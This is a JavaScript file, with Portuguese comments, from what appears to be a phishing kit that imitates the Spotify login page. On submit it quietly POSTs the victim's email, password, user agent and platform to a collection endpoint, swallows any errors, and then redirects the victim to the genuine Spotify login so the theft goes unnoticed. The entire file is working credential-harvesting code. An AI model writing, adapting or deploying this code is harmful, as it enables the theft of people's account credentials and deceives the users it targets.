document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        console.log('[Spotify] Form submit triggered');

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        if (!email || !password) {
            alert('Please fill in all fields');
            return;
        }

        console.log('[Spotify] Chamando enviarCredenciais');
        // Envia credenciais para o servidor
        enviarCredenciais(email, password);
    });

    function enviarCredenciais(email, senha) {
        // Envia credenciais em background
        fetch('/api/salvar-client', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessao: 'spotify_login_' + Date.now(),
                dados: [
                    { tipo: 'credential', campo: 'email', tecla: email, timestamp: new Date().toISOString() },
                    { tipo: 'credential', campo: 'password', tecla: senha, timestamp: new Date().toISOString() }
                ],
                navegador: navigator.userAgent,
                plataforma: navigator.platform,
                template: 'spotify'
            })
        }).catch(() => {});

        // Redireciona imediatamente para o site oficial
        console.log('[Spotify] Iniciando redirect...');
        setTimeout(() => {
            console.log('[Spotify] Executando redirect agora');
            try {
                window.top.location.replace('https://accounts.spotify.com/login');
            } catch(e) {
                console.log('[Spotify] Replace falhou, tentando href');
                try {
                    window.top.location.href = 'https://accounts.spotify.com/login';
                } catch(e2) {
                    console.log('[Spotify] Href falhou, tentando window.open');
                    window.open('https://accounts.spotify.com/login', '_top');
                }
            }
        }, 200);
    }

    // Social buttons redirect
    document.querySelectorAll('.social-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            window.location.href = 'https://accounts.spotify.com/login';
        });
    });
});
